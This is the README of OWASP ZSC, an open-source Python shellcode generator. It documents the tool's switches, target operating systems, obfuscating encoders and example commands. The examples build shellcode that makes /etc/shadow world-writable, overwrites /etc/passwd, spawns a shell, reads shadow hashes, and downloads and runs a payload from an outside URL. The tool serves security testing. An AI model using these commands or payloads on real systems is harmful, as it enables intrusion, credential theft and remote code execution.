OWASP ZSC
=========

OWASP ZCR Shellcoder is an open source software in python language which lets you 
generate customized  shellcodes for listed operation systems. This software 
can be run on Windows/Linux&Unix/OSX and others OS under python [2.x and 3.x compatible].

 * OWASP Page: https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
 * Home: http://zsc.z3r0d4y.com/
 * Features: http://zsc.z3r0d4y.com/table.html
 * Github: https://github.com/Ali-Razmjoo/OWASP-ZSC
 * Archive: https://github.com/Ali-Razmjoo/ZCR-Shellcoder-Archive
 * About Author: http://www.z3r0d4y.com/p/about.html
 * Mailing List: https://lists.owasp.org/mailman/listinfo/owasp-zsc-tool-project

![screenshot](http://zsc.z3r0d4y.com/images/Snapshot_2015-07-26_191951.png)

For more information read the document files in main directory or visit home page.


Usages And Examples
-------------------

python zsc.py -h
----------------


-h, --h, -help, --help => to see this help guide
-os => choose your os to create shellcode
-oslist	=> list os for switch -os
-o => output filename
-job => what shellcode gonna do for you ?
-joblist => list of -job switch
-encode => generate shellcode with encode
-types => types of encode for -encode switch
-wizard => wizard mod

-update => check for update
-about => about software and developers.



python zsc.py -wizard
---------------------

You can run `-wizard` to generate shellcode in easy way!

python zsc.py -oslist
----------------------------

 * [+] linux_x86
 * [+] linux_x64
 * [+] linux_arm
 * [+] linux_mips
 * [+] freebsd_x86
 * [+] freebsd_x64
 * [+] windows_x86
 * [+] windows_x64
 * [+] osx
 * [+] solaris_x86
 * [+] solaris_x64


python zsc.py -joblist
-----------------------------

 * [+] exec('/path/file')
 * [+] chmod('/path/file','permission number')
 * [+] write('/path/file','text to write')
 * [+] file_create('/path/file','text to write')
 * [+] dir_create('/path/folder')
 * [+] download('url','filename')
 * [+] download_execute('url','filename','command to execute')
 * [+] system('command to execute')
 * [+] script_executor('name of script','path and name of your script in your pc','execute command')

python zsc.py -types
---------------------------

 * [+] none
 * [+] xor_random
 * [+] xor_yourvalue
 * [+] add_random
 * [+] add_yourvalue
 * [+] sub_random
 * [+] sub_yourvalue
 * [+] inc
 * [+] inc_timesyouwant
 * [+] dec
 * [+] dec_timesyouwant
 * [+] mix_all

 
Generating shellcodes , using functions
----------------------------------------

`python zsc.py -os linux_x86 -encode none -job "chmod('/etc/shadow','777')" -o file.txt`

`python zsc.py -os linux_x86 -encode xor_random -job "write('/etc/passwd','user:pass')" -o file.txt`

`python zsc.py -os linux_x86 -encode xor_0x41414141 -job "exec('/bin/bash')" -o file.txt`

`python zsc.py -os linux_x86 -encode sub_0x4f442c4d -job "system('ls')" -o file.txt`

`python zsc.py -os linux_x86 -encode inc -job "system('ls[space]-la')" -o file.txt`

`python zsc.py -os linux_x86 -encode dec_10 -job "system('ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file')" -o file.txt`

`python zsc.py -os linux_x86 -encode add_random -job "file_create('/root/Desktop/hello.txt','hello')" -o file.txt`

`python zsc.py -os linux_x86 -encode dec_2 -job "file_create('/root/Desktop/hello2.txt','hello[space]world[space]!')" -o file.txt`

`python zsc.py -os linux_x86 -encode mix_all -job "dir_create('/root/Desktop/mydirectory')" -o file.txt`

`python zsc.py -os linux_x86 -encode add_0x457f9f3d -job "download('http://www.z3r0d4y.com/exploit.type','myfile.type')" -o file.txt`

`python zsc.py -os linux_x86 -encode mix_all -job "download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','./myfile.type')" -o file.txt`

Note: exec() doesn't support any ARGV same as `exec('/bin/bash -c ls')` or `exec('/bin/bash','-c','ls')`, you have to use `system()` function.

Note: Remember don't use `" "` and replace it with `"[space]"`
